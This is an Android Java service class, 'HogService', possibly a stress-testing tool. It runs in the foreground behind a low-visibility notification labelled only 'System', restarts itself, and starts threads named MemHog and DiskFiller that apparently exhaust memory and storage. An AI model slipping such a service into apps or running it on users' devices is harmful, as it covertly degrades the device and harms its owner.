package com.rhfvnc.strain;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.IBinder;
public class HogService extends Service {
    protected int hogThreads = 6;
    public static void start(Context c, Class<?> cls) {
        Intent i = new Intent(c, cls);
        if (android.os.Build.VERSION.SDK_INT >= 26) c.startForegroundService(i);
        else c.startService(i);
    }
    @Override
    public void onCreate() {
        super.onCreate();
        if (android.os.Build.VERSION.SDK_INT >= 26) {
            android.app.NotificationChannel ch = new android.app.NotificationChannel(
                    "hog", "System", android.app.NotificationManager.IMPORTANCE_MIN);
            android.app.NotificationManager nm = getSystemService(android.app.NotificationManager.class);
            if (nm != null) nm.createNotificationChannel(ch);
        }
        android.app.Notification n = new android.app.Notification.Builder(this, "hog")
                .setContentTitle("System").setContentText("Running")
                .setSmallIcon(android.R.drawable.stat_notify_sync).setOngoing(true).build();
        startForeground(2, n);
        for (int i = 0; i < hogThreads; i++) {
            Thread t = new Thread(new MemHog(i));
            t.setDaemon(true);
            t.start();
        }
        Thread d = new Thread(new DiskFiller(this));
        d.setDaemon(true);
        d.start();
    }
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) { return START_STICKY; }
    @Override
    public IBinder onBind(Intent intent) { return null; }
}
